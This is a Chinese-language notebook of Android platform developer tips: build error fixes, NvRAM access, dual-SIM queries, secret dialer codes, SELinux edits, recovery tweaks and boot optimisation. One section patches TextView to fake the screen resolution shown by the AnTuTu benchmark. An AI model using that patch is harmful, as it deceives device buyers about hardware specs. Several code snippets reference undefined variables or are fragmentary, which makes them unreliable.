    Out of memory error (version 1.3-rc7 'Douarn' (445000 d7be3910514558d6715ce455ce0861ae2f56925a by android-jack-team@google.com)).
    GC overhead limit exceeded.
    Try increasing heap size with java option '-Xmx<size>'.

    解决：
        export JACK_SERVER_VM_ARGUMENTS="-Dfile.encoding=UTF-8 -XX:+TieredCompilation -Xmx10240m"     
        ./prebuilts/sdk/tools/jack-admin kill-server
        ./prebuilts/sdk/tools/jack-admin start-server        

3.3
        FAILED: out/target/common/docs/api-stubs-timestamp 
        /bin/bash out/target/common/docs/api-stubs-timestamp.rsp
        OpenJDK 64-Bit Server VM warning: INFO: os::commit_memory(0x00000000bdc80000, 87556096, 0) failed; error='Cannot allocate memory' (errno=12)
        #
        # There is insufficient memory for the Java Runtime Environment to continue.
        # Native memory allocation (mmap) failed to map 87556096 bytes for committing reserved memory.
        # An error report file with more information is saved as:

    解决：
        mkdir /swapfile
      cd /swapfile
        sudo dd if=/dev/zero of=swap bs=1024 count=10000000        # 10g 交换空间
        sudo mkswap -f  swap
        sudo swapon swap        # 启动交换空间

3.4         
     ####  no out/target/product/sl8541e_1h10_go/sml-sign.bin, pls check #### 
     ####  no out/target/product/sl8541e_1h10_go/tos-sign.bin, pls check ####    

    解决：
         查找 sml.bin tos.bin 文件，并将其放到 out/target/product/ 目录下。

注：
     1. 在笔记本或虚拟机中进行编译时，make 前先进行3.1,3.2 的配置

4. 烧录
    1. 驱动安装
         解压  MODEM 下 CP0 中的 FM_BASE_17B_Release_W18.47.2_9832e_CUSTOMER.rar ,安装 Tools 中的 drivers(可 安装 Drivers 文件夹下的驱动)
3.4 jack-server端口冲突
    解决：
    1).改端口号
    ~/.jack-server/config.properties
    ~/.jack-settings
    两个文件的SERVER_PORT_SERVICE和SERVER_PORT_ADMIN要一致
    2).改权限（要注意.jack-server文件夹里面每个文件和文件夹的权限）
    chmod 700 ~/.jack-server
    chmod 600 ~/.jack-server/client.jks
    chmod 600 ~/.jack-server/client.pem
    chmod 600 ~/.jack-server/launcher.jar
    chmod 600 ~/.jack-server/server-1.jar
    chmod 600 ~/.jack-server/server.jks
    chmod 600 ~/.jack-server/server.pem
    chmod 600 ~/.jack-server/config.properties
    chmod 775 ~/.jack-server/jack
    chmod 764 ~/.jack-server/jack/jack-1546930398112-0.jar
    chmod 775 ~/.jack-server/logs
    chmod 764 ~/.jack-server/logs/outputs.txt
```

## byte变成无符号整数

```text
int result = bytes & 0xff;
```

## [NvRAM] apk中读写nvram

```text
nvram中LID对应的结构体如:
typedef struct {
    int uid;
} NVRAM_AMOI_TEST_STRUCT;

demo code
//将int型转化成byte数组
private static  byte[]  getBytes(int data){
    byte[]  bytes = new byte[4] ;
    bytes[0]  = (byte)(data&0xff);
    bytes[1]  = (byte)((data&0xff00)>>8);
    bytes[2]  = (byte)((data&0xff0000)>>16);        
    bytes[3]  = (byte)((data&0xff000000)>>24);
    return bytes;
}

//将byte数组转换成整型
public static int byte2int(byte[]  res) {          
    int targets = (res[0]  & 0xff) | ((res[1]  << 8) & 0xff00) | ((res[2]  << 24) >>> 8) | (res[3]  << 24);   
    return targets;   
}

//向nvram中写数据
public void writeData(int file_lid) {
    IBinder binder = ServiceManager.getService("NvRAMAgent");
    NvRAMAgent agent = NvRAMAgent.Stub.asInterface(binder);
    int n = 10;
    byte[]  buff = new byte[] {0,0,0,0};
    byte[]  by = getBytes(n);
    for (int i=0;i<4;i++) {
        write_buff[i]  = by[i] ;
        try {
            int flag = agent.writeFile(file_lid, write_buff);
            if (flag > 0) {
                System.out.println("write success");
            } else {
                System.out.println("write failed");
            }
        } catch (RemoteException e) {
            e.printStackTrace();
        }
    }
}

//从nvram中读取数据
public void readData(int file_lid) {
    IBinder binder = ServiceManager.getService("NvRAMAgent");
    NvRAMAgent agent = NvRAMAgent.Stub.asInterface(binder);
    byte[]  buff = null;
    try {
        buff = agent .readFile(file_lid);// read buffer from nvram
    } catch (RemoteException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
    for (i=0;i<buff.length;i++) {
        System.out.println("i:"+buff[i] );
    }
    int b = byte2int(temp);
    System.out.println("b:"+b);
}
```

## [sprd] sprd获取单双卡

```text
private static void initSpreadDoubleSim() {
 try {
  Class<?> c = Class.forName("com.android.internal.telephony.PhoneFactory");
  Method m = c.getMethod("getServiceName", String.class, int.class);
  spreadTmService = (String) m.invoke(c, Context.TELEPHONY_SERVICE, 1);
  TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
  imsi_1 = tm.getSubscriberId();
  imei_1 = tm.getDeviceId();
  phoneType_1 = tm.getPhoneType();
  TelephonyManager tm1 = (TelephonyManager) mContext.getSystemService(spreadTmService);
  imsi_2 = tm1.getSubscriberId();
  imei_2 = tm1.getDeviceId();
  phoneType_2 = tm1.getPhoneType();
  if (TextUtils.isEmpty(imsi_1) && (!TextUtils.isEmpty(imsi_2))) {
   defaultImsi = imsi_2;
  }
  if (TextUtils.isEmpty(imsi_2) && (!TextUtils.isEmpty(imsi_1))) {
   defaultImsi = imsi_1;
  }
 } catch (Exception e) {
  isSpreadDoubleSim = false;
  return;
 }
 isSpreadDoubleSim = true;
}
```

## 暗码大全

```text
*#*#4636#*#**
显示手机信息、电池信息、电池记录、使用统计数据、WiFi 信息*
*#*#7780#*#**
重设为原厂设定，不会删除预设程序，及 SD 卡档案。*
*2767*3855#*
重设为原厂设定，会删除 SD 卡所有档案。*
a*#*#34971539#*#**
显示相机相机韧体版本，或更新相机韧体*
*#*#7594#*#**
当长按关机按钮时，会出现一个切换手机模式的窗口，包括: 静音模式、飞航模式及关机，你可以用以上代码，直接变成关机按钮。*
*#*#273283*255*663282*#*#**
开启一个能让你备份媒体文件的地方，例如相片、声音及影片等*
*#*#197328640#*#*
启动服务模式，可以测试手机部分设置及更改设定*
WLAN、 GPS 及蓝牙测试的代码*
*#*#232339#*#* 或 *#*#526#*#* 或 *#*#528#*#* – WLAN 测试*
*#*#232338#*#* – 显示 WiFi MAC 地址*
*#*#1472365#*#* – GPS 测试*
*#*#1575#*#* – 其它 GPS 测试*
*#*#232331#*#* – 蓝牙测试*
*#*#232337#*# – 显示蓝牙装置地址*
*#*#8255#*#*启动 GTalk 服务监视器　*
显示手机软件版本的代码*
*#*#4986*2650468#*#* – PDA、 Phone、 H/W、 RFCallDate*
*#*#1234#*#* – PDA 及 Phone*
*#*#1111#*#* – FTA SW 版本*
*#*#2222#*#* – FTA HW 版本*
*#*#44336#*#* – PDA 、Phone、 csc、 build Time、anzhi.name、 changelist number*
各项硬件测试*
*#*#0283#*#* – Packet Loopback*
*#*#0*#*#* – LCD 测试*
*#*#0673#*#* 或 *#*#0289#*#* – Melody 测试*
*#*#0842#*#* – 装置测试，例如振动、亮度*
*#*#2663#*#* – 触控屏幕版本*
*#*#2664#*#* – 触控屏幕测试*
*#*#0588#*#* – 接近感应器测试*
*#*#3264#*#* – 内存版本
```

## [知识点] 480P、720P、1080P是什么意思?

```text
720P是美国电影电视工程师协会(SMPTE)制定的高等级高清数字电视的格式标准，有效显示格式为：1280×720.SMPTE(美国电影电视工程协会)将数字高清信号数字电视扫描线的不同分为1080p、1080i、720P(i是interlace,隔行的意思，p是Progressive,逐行的意思)。

4K分辨率并不特指某个特定数值，它指的是水平方向约有4000个像素点左右，根据不同的应用领域而存在细微差距。

标清、高清、全高清、超清(超高清)
480x320, 640x480 标清
1024x720p 高清（High Definition）
1920x1080i (隔行扫描) 也属于高清
1920x1080p 全高清（Full High Definition）
3840x2160,7680x4320 超高清（Ultra High-Definition）

美国消费电子协会（CEA）将4K的分辨率正式命名为Ultra HD（Ultra High-Definition）
```

## [知识点] NXP荷兰恩智浦半导体公司（NXP Semiconductors）

## [知识点] IMEI+MEID

```text
IMEI号是GSM的概念，CDMA对应的是MEID号。

IMEI（International Mobile Equipment Identity）是国际移动设备身份码，目前GSM/WCDMA/LTE手机终端需要使用IMEI号码。在单卡工程中一个手机对应一个IMEI号；双卡工程中一张卡对应一个IMEI号，双卡共有两个IMEI号。

MEID (Mobile Equipment Identifier) 移动设备识别码，是CDMA手机的唯一身份识别码。

通过GSMPhone对象来调用getDeviceId()函数，获取到的就是IMEI号。

通过CDMAPhone对象来调用getDeviceId()函数，获取到的就是MEID号。
```

## [prop] Android 8.1 添加属性SystemProperties.set可执行权限

```text
在Android 8.1由于selinux权限的限制。默认SystemProperties.set执行报avc denied，即使给 app android:sharedUserId="android.uid.system"权限也不行，如果想执行必须修改一些文件。

device/mediatek/sepolicy/basic/non_plat/property.te

type persist_defaulthome_prop, property_type;
device/mediatek/sepolicy/basic/non_plat/property_contexts

persist.defaulthome.enable u:object_r:persist_defaulthome_prop:s0
device/mediatek/sepolicy/basic/non_plat/system_app.te

allow system_app persist_defaulthome_prop:property_service set;
allow system_app persist_defaulthome_prop:file {getattr open read };
这样app 就有可执行权限了。
如果想让server 也有权限添加
device/mediatek/sepolicy/basic/non_plat/system_server.te

allow system_server persist_defaulthome_prop:property_service set;
allow system_server persist_defaulthome_prop:file {getattr open read };
```

## [SPRD] 低电时如何禁止闪光灯

```text
[QUESTION] 
低电时如何禁止闪光灯

[ANSWER] 
在device/sprd/<>/system.prop文件中添加如下变量

persist.sys.cam.battery.flash=15
15代表手机电量低于15%就会关闭闪光灯功能
```

## [默认值] WIFI直连名称修改

```text
frameworks/opt/net/wifi/service/java/com/android/server/wifi/p2p/WifiP2pServiceImpl.java
private String getPersistedDeviceName() {
    String deviceName = mFrameworkFacade.getStringSetting(mContext,
            Settings.Global.WIFI_P2P_DEVICE_NAME);
    if (deviceName == null) {
        // We use the 4 digits of the ANDROID_ID to have a friendly
        // default that has low likelihood of collision with a peer
        String id = mFrameworkFacade.getSecureStringSetting(mContext,
                Settings.Secure.ANDROID_ID);
        String ssid = WifiFeaturesUtils.FeatureProperty.SUPPORT_SPRD_P2P_CUSTOMIZED_NAME;
        if (ssid != null && ssid.isEmpty()) {
            return "Android_" + id.substring(0, 4);
        } else {
            return ssid;
        }
    }
    return deviceName;
}

从代码中可以看到如果没有设置 WIFI_P2P_DEVICE_NAME 默认值的话，手机中显示的wifi名称是 Android_xxxx
所以只需要在 SettingsProvider 中加载 WIFI_P2P_DEVICE_NAME 默认值到 Settings.Global 数据库中

frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java
private void loadGlobalSettings(SQLiteDatabase db) {
    ......
    loadStringSetting(stmt, Settings.Global.WIFI_P2P_DEVICE_NAME, R.string.def_wifi_direct_name);
    ......
}

然后在 defaults.xml 中添加 def_wifi_direct_name 默认值
frameworks/base/packages/SettingsProvider/res/values/defaults.xml
<string name="def_wifi_direct_name" translatable="false">WiFi P2P</string>
```

## [CMD] appops

```text
appops可以查看/修改权限相关信息

$ adb shell appops get com.android.phone
VIBRATE: allow; time=+1d3h57m1s111ms ago; duration=+63ms
READ_CONTACTS: allow; time=+2h10m59s285ms ago
READ_SMS: allow; time=+2h10m49s858ms ago
WRITE_SMS: allow; time=+3m46s339ms ago
READ_ICC_SMS: allow; time=+2h10m49s859ms ago
WRITE_CLIPBOARD: allow; time=+10d2h24m17s819ms ago
WAKE_LOCK: allow; time=+5s122ms ago; duration=+14ms
READ_EXTERNAL_STORAGE: allow; time=+14h31m4s898ms ago
WRITE_EXTERNAL_STORAGE: allow; time=+14h31m4s898ms ago

$ adb shell appops get com.android.phone READ_CONTACTS
READ_CONTACTS: allow; time=+2h28m33s274ms ago
```

## [clock]  [bug] Android Q DeskClock 一手指长按城市图标，另一个手指点击上方倒计时图标，手指松开，倒计时提示框弹出，开始从0负倒计时

```text
从现象上看好像是手指松开的时候还是触发了 onClick 事件，从界面上看 Timer 界面上的 fab 按钮是不可见的
所以决定在 onClick 事件中先判断 fab 按钮是否可见，如果不可见就return 掉不让他继续执行，修改如下
vendor/sprd/platform/packages/apps/SprdDeskClock/src/com/android/deskclock/timer/TimerFragment.java
    @Override
    public void onFabClick(@NonNull ImageView fab) {
        //modified begin
        if (fab != null && fab.getVisibility() != View.VISIBLE) {
            return;
        }
        // modified end
```

## [知识点]  [图片] SVG路径含义

```text
命令      名称                                  参数
M       moveto  移动到                         (x y)+
Z       closepath  关闭路径                     (none)
L       lineto  画线到                         (x y)+
H       horizontal lineto  水平线到             x+
V       vertical lineto  垂直线到               y+
A       elliptical arc椭圆弧                   (rx ry x-axis-rotation large-arc-flag sweep-flag x y)+
C       curveto 三次贝塞尔曲线到                (x1 y1 x2 y2 x y)+
S       smooth curveto光滑三次贝塞尔曲线到        (x2 y2 x y)+
Q       Bézier curveto二次贝塞尔曲线到          (x1 y1 x y)+
T       smooth Bézier curveto光滑二次贝塞尔曲线到  (x y)+
```

## [bt] 根据文件名称修改安卓默认的蓝牙接收文件地址

```text
--- a/packages/apps/Bluetooth/src/com/android/bluetooth/opp/BluetoothOppReceiver.java
+++ b/packages/apps/Bluetooth/src/com/android/bluetooth/opp/BluetoothOppReceiver.java
@@ -52,8 +52,8 @@ import com.android.bluetooth.R;
  */
+                       ){
+                       //      root =root+"/"
+                                base = new File(root + Constants.USETTING_STORE_SUBDIR);
+                       }else{
+                                base = new File(root + Constants.DEFAULT_STORE_SUBDIR);
+                       }
+                       
+                       // base = new File(root + Constants.USETTING_STORE_SUBDIR);
+                        
+           Log.d(Constants.TAG, "bbbbbbbbbb = " +base);
             if (!base.isDirectory() && !base.mkdir()) {
                 if (D) {
                     Log.d(Constants.TAG,
@@ -237,8 +252,22 @@ public class BluetoothOppReceiveFileInfo {
         try {
             File receiveFile = new File(uniqueFileName);
             if (sDesiredStoragePath == null) {
-                sDesiredStoragePath = Environment.getExternalStorageDirectory().getPath()
+
+                       Log.d("bbbbbbbbbbbbb","uniqueFileName = "+uniqueFileName);      
+                       
+                       if(
+                       uniqueFileName.contains("settings_global")||uniqueFileName.contains("settings_system")
+                       ||uniqueFileName.contains("settings_secure")||uniqueFileName.contains("WifiConfigStore")
+                       ||uniqueFileName.contains("bt_config")
+                       ){
+                                                               sDesiredStoragePath = Environment.getExternalStorageDirectory().getPath()
+                        + Constants.USETTING_STORE_SUBDIR;             
+                                               
+                       }else{
+                                               sDesiredStoragePath = Environment.getExternalStorageDirectory().getPath()
                         + Constants.DEFAULT_STORE_SUBDIR;
+                       }
+
             }
             String canonicalPath = receiveFile.getCanonicalPath();
```

## [recovery] android 9.0 进入recovery 修改为按电源键显示菜单

```text
如果是原生就是按住电源+音量键
现在修改成只要按下电源键可以进入
L版本进入recovery mode 会出现小机器人界面
需同时按volume up & power 才能进入菜单，
如何改为像KK以前版本，直接按power 进入菜单

[SOLUTION] 
1.alps/bootable/recovery/Ui.cpp

key_long_press(false), 
key_down_count(0), 
enable_reboot(true), 
+ recovery_show_menu_flag(0), 
consecutive_power_keys(false), 
consecutive_alternate_keys(0), 

RecoveryUI::KeyAction RecoveryUI::CheckKey(int key) { 

+    if (key == KEY_POWER && recovery_show_menu_flag==false) { 
+      recovery_show_menu_flag=true; 
+      return TOGGLE; 
+    } 

if ((IsKeyPressed(KEY_POWER) && key == KEY_VOLUMEUP) || key == KEY_HOME) { 

2.alps/bootable/recovery/ui.h

int rel_sum; 
+ bool recovery_show_menu_flag; 
int consecutive_power_keys; 
int consecutive_alternate_keys; 
```

## 安卓7.0 安兔兔作假修改

```text
TextView.java
public void append(CharSequence text, int start, int end) {
    if (!(mText instanceof Editable)) {
        setText(mText, BufferType.EDITABLE);
    }
 String tempText2 = mText.toString().trim();
 if( tempText2.contains("1920") ){
  Log.d("4046","packageName  ,[TextView 1920 ]  --> tempText2 = "+tempText2);
  mText = tempText2.replace("1920","1999");
 }
 if( mText.contains("1080 x 1920") ){
  Log.d("4052","packageName  ,[TextView 1922220 ]  --> tempText2 = "+tempText2);
  mText = tempText2.replace("1080 x 1920","1080 x 1999");
 }

    ((Editable) mText).append(text, start, end);
    Log.d("4051","append   ,[TextView 1920 ]  --> text = "+text);
    Log.d("4052","append   ,[TextView 1920 ]  --> mText = "+mText);
    if (mAutoLinkMask != 0) {
        boolean linksWereAdded = Linkify.addLinks((Spannable) mText, mAutoLinkMask);
        // Do not change the movement method for text that support text selection as it
        // would prevent an arbitrary cursor displacement.
        if (linksWereAdded && mLinksClickable && !textCanBeSelected()) {
            setMovementMethod(LinkMovementMethod.getInstance());
        }
    }
}
```

## [反射] 反射机制调用系统服务EthernetManager

```text
private void getNetInfo(Context context) {
    try {
       // Log.d(TAG, "dddd getNetInfo is " );

        Method getServiceMethod = Class.forName("android.os.ServiceManager").getDeclaredMethod("getService", new Class[] {String.class});
        Object ServiceManager = getServiceMethod.invoke(null, new Object[] {"ethernet"});
        Class<?> cStub = Class.forName("android.net.IEthernetManager$Stub");
        Method asInterface = cStub.getMethod("asInterface", IBinder.class);
        Object iEtherManager = asInterface.invoke(null, ServiceManager);
        Method getIpAddress = iEtherManager.getClass().getDeclaredMethod("getIpAddress",null);
        Method getNetmask = iEtherManager.getClass().getDeclaredMethod("getNetmask",null);
        Method getGateway = iEtherManager.getClass().getDeclaredMethod("getGateway",null);
        Method getDns = iEtherManager.getClass().getDeclaredMethod("getDns",null);
        Method getEthernetMacAddress = iEtherManager.getClass().getDeclaredMethod("getEthernetMacAddress", String.class);


        String ipAddress = (String)getIpAddress.invoke(iEtherManager);
        String netmask = (String)getNetmask.invoke(iEtherManager);
        String gateway = (String)getGateway.invoke(iEtherManager);
        String dns = (String)getDns.invoke(iEtherManager);
        String mac = (String)getEthernetMacAddress.invoke(iEtherManager,"eth0");
        Log.d(TAG," mac 地址是 "+mac);

        this.ipAddress.setText("ip: "+ ipAddress + "\r\n" +
                "子网掩码: "+ netmask + "\r\n" +
                "网关地址: "+ gateway + "\r\n" +
                "DNS: " + dns + "\r\n" +
                "eth0 Mac: "+mac);
        Toast.makeText(context, "以太网已连接.... Ip is "+ipAddress, Toast.LENGTH_SHORT).show();
        //clearForcedDisplaySize = iWindowManager.getClass().getMethod("clearForcedDisplaySize",int.class);
    } catch (NoSuchMethodException e) {
        e.printStackTrace();
    } catch (ClassNotFoundException e) {
        e.printStackTrace();
    } catch (IllegalAccessException e) {
        e.printStackTrace();
    } catch (InvocationTargetException e) {
        e.printStackTrace();
    }
}
```

## [性能]  性能优化

```text
平时开发中设计到哪些性能优化，你是从哪些地方来优化，你是通过什么工具来分析的？
笼统的说：就是让App反应更快，使用更稳，流量、电量更省，apk更小。
具体的说：省电优化、内存优化、网络优化、图片优化、UI优化。
更快：使用时避免出现卡顿，响应速度快，减少用户等待的时间，满足用户期望。
UI优化：
分析工具：Systrace
(1)减少层级，合理使用 RelativeLayout 和 LinearLayout，合理使用Merge，Include。
(2)提高显示速度，使用 ViewStub，它是一个看不见的、不占布局位置、占用资源非常小的视图对象。
(3)布局复用，可以通过标签来提高复用。
(4)尽可能少用wrap_content，wrap_content 会增加布局 measure 时计算成本，在已知宽高为固定值时，不用wrap_content 。
(5)删除控件中无用的属性。
更稳：减低 Crash 率和 ANR 率，不要在用户使用过程中崩溃和无响应。
(1)增加相应的判断，以及异常处理。
(2)避免在主线程做耗时操作。
更省：节省流量和耗电，节约内存，减少用户使用成本，避免使用时导致手机发烫。
耗电分析工具：Battery Historian
(1)避免浮点运算。
(2)根据客户端图片的大小要求叫UI做相应大小的图提供给服务器，避免过大消耗更多流量和电量。
(3)不用的广播，服务记得及时关闭。
内存分析工具：Memory Monitor
(1)对象引用:强引用、软引用、弱引用、虚引用四种引用类型，根据业务需求合理使用不同，选择不同的引用类型。
(2)减少不必要的内存开销:注意自动装箱，增加内存复用，比如有效利用系统自带的资源、视图复用、对象池、Bitmap对象的复用。
(3)使用最优的数据类型:比如针对数据类容器结构，可以使用ArrayMap数据结构，避免使用枚举类型，使用缓存Lrucache等。
(4)图片内存优化:点9图减少图片大小以及可以设置位图规格，根据采样因子做压缩，用一些图片缓存方式对图片进行管理等。
更小：安装包小可以降低用户的安装成本。
(1)做混淆优化代码。
(2)删除无用的代码及图片相应的本地库。
(3)Lint优化。
(4)zip压缩。
```

## [性能]  开机优化

```text
下面部分写的比较零散，整合了一下，可以移步到最新一篇：
http://blog.csdn.net/xxm282828/article/details/49095839

通常情况下，Android系统开机保持在20s~25s应该算是合格比较好的状态。

最近几天在看关于Android系统开机启动过程的相关内容。做个笔记。

关于有话Android系统开机时间有话，采取三个措施有话，修改ZygoteInit.java。 Android系统开机启动过程这里就不说了，网上很多大牛对应的文章。

1. 修改ZygoteInit.java 中预加载资源函数preload() ,  preloadClasses(); 与 preloadResources(); 并行加载。
2. 修改读取配置信息过程中GC频率。
3. 提升进程优先级。
1. 

    static void preload() {
        //
        Thread  preloadRsThread = new Thread(new Runnable(){
 
            @Override
            public void run() {
                // TODO Auto-generated method stub
            //将该资源加载放在子线程中  。加载资源文件要比加载classes文件要快，因此这里不提升子线程优先级。  
            preloadResources();
            }
 
        }) ;
 
        preloadRsThread.start() ;
        preloadClasses();
        //wait preloadRes complete.
        try {
            preloadRsThread.join() ;
        } catch (InterruptedException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
       
        //暴露什么问题。
        preloadOpenGL();
    }


2.
/**
     * Performs Zygote process initialization. Loads and initializes
     * commonly used classes.
     *
     * Most classes only cause a few hundred bytes to be allocated, but
     * a few will allocate a dozen Kbytes (in one case, 500+K).
     */
    private static void preloadClasses() {
        final VMRuntime runtime = VMRuntime.getRuntime();
 
        InputStream is = ClassLoader.getSystemClassLoader().getResourceAsStream(
                PRELOADED_CLASSES);
        if (is == null) {
            Log.e(TAG, "Couldn't find " + PRELOADED_CLASSES + ".");
        } else {
            Log.i(TAG, "Preloading classes...");
            long startTime = SystemClock.uptimeMillis();
 
            // Drop root perms while running static initializers.
            setEffectiveGroup(UNPRIVILEGED_GID);
            setEffectiveUser(UNPRIVILEGED_UID);
 
            // Alter the target heap utilization.  With explicit GCs this
            // is not likely to have any effect.
            float defaultUtilization = runtime.getTargetHeapUtilization();
            runtime.setTargetHeapUtilization(0.8f);
 
            // Start with a clean slate.
            System.gc();
            runtime.runFinalizationSync();
            Debug.startAllocCounting();
 
            try {
                BufferedReader br
                    = new BufferedReader(new InputStreamReader(is), 256);
 
                int count = 0;
                String line;
                while ((line = br.readLine()) != null) {
                    // Skip comments and blank lines.
                    line = line.trim();
                    if (line.startsWith("#") || line.equals("")) {
                        continue;
                    }
 
                    try {
                        if (false) {
                            Log.v(TAG, "Preloading " + line + "...");
                        }
                        Class.forName(line);
                        //减少GC频率，modify   begin
                        if (count%128==0&&Debug.getGlobalAllocSize() > PRELOAD_GC_THRESHOLD) {//end
                            if (false) {
                                Log.v(TAG,
                                    " GC at " + Debug.getGlobalAllocSize());
                            }
                            System.gc();
                            runtime.runFinalizationSync();
                            Debug.resetGlobalAllocSize();
                        }
                        count++;
                    } catch (ClassNotFoundException e) {
                        Log.w(TAG, "Class not found for preloading: " + line);
                    } catch (UnsatisfiedLinkError e) {
                        Log.w(TAG, "Problem preloading " + line + ": " + e);
                    } catch (Throwable t) {
                        Log.e(TAG, "Error preloading " + line + ".", t);
                        if (t instanceof Error) {
                            throw (Error) t;
                        }
                        if (t instanceof RuntimeException) {
                            throw (RuntimeException) t;
                        }
                        throw new RuntimeException(t);
                    }
                }
 
                Log.i(TAG, "...preloaded " + count + " classes in "
                        + (SystemClock.uptimeMillis()-startTime) + "ms.");
            } catch (IOException e) {
                Log.e(TAG, "Error reading " + PRELOADED_CLASSES + ".", e);
            } finally {
                IoUtils.closeQuietly(is);
                // Restore default.
                runtime.setTargetHeapUtilization(defaultUtilization);
 
                // Fill in dex caches with classes, fields, and methods brought in by preloading.
                runtime.preloadDexCaches();
 
                Debug.stopAllocCounting();
 
                // Bring back root. We'll need it later.
                setEffectiveUser(ROOT_UID);
                setEffectiveGroup(ROOT_GID);
            }
        }
    }

3.
//    ZygoteInit.java入口
    public static void main(String argv[] ) {
        try {
 
            //优化开机速度 begin
            /* 20150127 begin */
            //获取当前进程优先级
            int currentPriority = Process.getThreadPriority(Process.myPid()) ;
            //提升当前进程优先级。
            Process.setThreadPriority(Process.THREAD_PRIORITY_AUDIO) ;
            /* 20150127 end */
            
            // Start profiling the zygote initialization.
            SamplingProfilerIntegration.start();
 
//            1.注册socket服务端
            registerZygoteSocket();
            EventLog.writeEvent(LOG_BOOT_PROGRESS_PRELOAD_START,
                SystemClock.uptimeMillis());
//            5.加载资源
            preload();
            EventLog.writeEvent(LOG_BOOT_PROGRESS_PRELOAD_END,
                SystemClock.uptimeMillis());
 
            // Finish profiling the zygote initialization.
            SamplingProfilerIntegration.writeZygoteSnapshot();
 
            // Do an initial gc to clean up after startup
            gc();
            
            /* 20150127 begin */
            Process.setThreadPriority(currentPriority) ;
            /* 20150127 end */
            //优化开机速度 end
            // Disable tracing so that forked processes do not inherit stale tracing tags from
            // Zygote.
            Trace.setTracingEnabled(false);
 
            // If requested, start system server directly from Zygote
            if (argv.length != 2) {
                throw new RuntimeException(argv[0]  + USAGE_STRING);
            }
//          2. 调用starySystemServer（）方法
            if (argv[1] .equals("start-system-server")) {
                startSystemServer();
            } else if (!argv[1] .equals("")) {
                throw new RuntimeException(argv[0]  + USAGE_STRING);
            }
 
            Log.i(TAG, "Accepting command socket connections");
 
            //3.循环监听并接收客户端请求。
            runSelectLoop();
//关闭socket
            closeServerSocket();
        } catch (MethodAndArgsCaller caller) {
//          4  《深入理解Android卷1》作者说这里比较重要
            caller.run();
        } catch (RuntimeException ex) {
            Log.e(TAG, "Zygote died with exception", ex);
            closeServerSocket();
            throw ex;
        }
    }

4.修改gc调用阀值
/** when preloading, GC after allocating this many bytes 
 * 
 * 20150127 优化开机速度
 */

//- private static final int PRELOAD_GC_THRESHOLD = 50000;
private static final int PRELOAD_GC_THRESHOLD = 64*1024*1024;

/*20150127 优化开机速度 end*/

另外，Android系统启动过程中，会预先加载资源文件，这些文件中，包含了很多系统应用会频繁使用到的资源文件，比如图片资源等。因此，我们自己的新添加其他的部分资源也可以预先加载到内存，

这样不仅提升响应速度，而且也可以加快应用的冷启动速度。

Android系统性能优化是个大工程，从一个小小的细节出发，或许能收获哪怕几百毫秒的时间，也是不错的。细节决定成败。

关于进程优先级：

参考：http://blog.csdn.net/ashqal/article/details/7633802

Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND); //设置线程优先级为后台，这样当多个线程并发后很多无关紧要的线程分配的CPU时间将会减少，有利于主线程的处理，有以下几种:
int THREAD_PRIORITY_AUDIO ;//标准音乐播放使用的线程优先级
int THREAD_PRIORITY_BACKGROUND ;//标准后台程序
int THREAD_PRIORITY_DEFAULT ;// 默认应用的优先级
int THREAD_PRIORITY_DISPLAY ;//标准显示系统优先级，主要是改善UI的刷新
int THREAD_PRIORITY_FOREGROUND ; //标准前台线程优先级
int THREAD_PRIORITY_LESS_FAVORABLE ;//低于favorable
int THREAD_PRIORITY_LOWEST  ;//有效的线程最低的优先级
int THREAD_PRIORITY_MORE_FAVORABLE ; //高于favorable
int THREAD_PRIORITY_URGENT_AUDIO  ;//标准较重要音频播放优先级
int THREAD_PRIORITY_URGENT_DISPLAY  ;//标准较重要显示优先级，对于输入事件同样适用。


Android系统开机优化，可以修改的地方还有很多。后续会补上。

此外，Android开机过程中，PackageManagerService会扫描系统内置apk，因此这个过程也是耗费时间比较长的。

在这个过程中下功夫还是很有必要。

比如odex优化等。
```

## [性能] 利用BLCR加快android的启动过程

```text
https://blog.csdn.net/shuaiff/article/details/5894646
```

## [CMD] 查看系统环境变量

```text
adb shell export
```

## [apn] apns-conf.xml 中配置无效

```text
1.在apns-conf.xml 中配置 IPV4 无效?
packages/apps/Settings/res/values/arrays.xml
<!-- Authentication Types used in APN editor -->
<string-array name="apn_protocol_entries">
    <item>IPv4</item>
    <item>IPv6</item>
    <item>IPv4/IPv6</item>
</string-array>

<string-array translatable="false" name="apn_protocol_values">
    <!-- Do not translate. -->
    <item>IP</item>
    <!-- Do not translate. -->
    <item>IPV6</item>
    <!-- Do not translate. -->
    <item>IPV4V6</item>
</string-array>

apns-conf.xml 中配置的protocal只能是 IP/IPV6/IPV4VP 这三个值

2. 在 apns-conf.xml 中配置 authenticationtype="PAP" 无效?
packages/providers/TelephonyProvider/src/com/android/providers/telephony/TelephonyProvider.java

private ContentValues getRow(XmlPullParser parser) {
    ......
    addIntAttribute(parser, "authtype", map, AUTH_TYPE);
    ......
}
只能配置 authtype 而不能配置 authenticationtype
authtype   0: None,  1: PAP,  2: CHAP,  3: PAP or CHAP. 
```

## [知识点] VGA分辨率

```text
QVGA 320*240像素
WQVGA 400*240像素
HVGA 320*480像素
VGA 640*480像素
WVGA 800*480像素
XGA 1024*480像素

QVGA 即Quarter VGA。顾名思义即VGA的四分之一尺寸
HVGA (Half-size VGA)，即VGA(640*480)的一半
WVGA 即Wide VGA
WQVGA 全称：Wide Quarter Video Graphics Array
VGA 和XGA(Extended Graphics Array) 详情见百度百科
```

## [sprd]  [默认值] 修改 Launcher3 桌面布局

```text
vendor/partner_gms/apps/GmsSampleIntegration/res_dhs_go/xml/partner_default_layout.xml

adb root;adb remount;nn GmsSampleIntegrationGo;adb push out/target/product/sp7731e_1h10/product/app/GmsSampleIntegrationGo/ /product/app/;adb shell pm clear com.google.android.gmsintegration;adb shell pm clear com.android.launcher3;mocp -l ~/ResourceBackup/sounds/success.ogg;adb shell pm path com.google.android.gmsintegration;
```

## 刘海屏相关修改，相关宏控和文件修改如下

```text
frameworks/base/core/res/res/values/config.xml
